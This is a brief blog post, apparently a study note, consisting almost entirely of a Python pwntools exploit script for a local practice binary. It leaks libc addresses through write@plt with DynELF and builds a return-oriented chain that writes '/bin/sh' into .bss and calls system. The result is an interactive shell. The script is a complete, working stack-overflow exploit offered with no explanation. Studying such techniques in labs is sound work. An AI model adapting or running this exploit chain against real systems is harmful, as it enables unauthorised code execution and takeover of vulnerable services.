---
layout: post
title: "Dynelf && rop"
---

整合的利用脚本：

<pre>#!/usr/bin/python

from pwn import *

#p = process('./vul')
p = remote('127.0.0.1', 10000)
elf = ELF('./vul')

# debug
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0])

payload_len = 140
write_plt_addr = elf.plt['write']
read_plt_addr = elf.plt['read']
main = elf.symbols['main']
print "[*] main address is " + hex(main)
vul_addr = elf.symbols['vul_func']
print "[*] vul_func address is " + hex(vul_addr)

def leak(address):
    payload = "A"*payload_len + p32(write_plt_addr) + p32(main) + p32(1) + p32(address) + p32(4)
    p.send(payload)
    data = p.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=elf)
system_addr = d.lookup('__libc_system', 'libc')
print "[+] Use DynELF to search system address is " + hex(system_addr)

buff_addr = elf.symbols['__bss_start']
pppr_addr = 0x080484d9  # pop esi ; pop edi ; pop ebp ; ret
exit_addr = 0xdeadbeef

payload2 = "A"*payload_len + p32(read_plt_addr) + p32(pppr_addr) + p32(0) + p32(buff_addr) + p32(8)
payload2 += p32(system_addr) + p32(exit_addr) + p32(buff_addr)

print "[*] Begin to get shell...\n"
p.send(payload2)
sleep(1)
p.send("/bin/sh\0")

p.interactive()</pre>
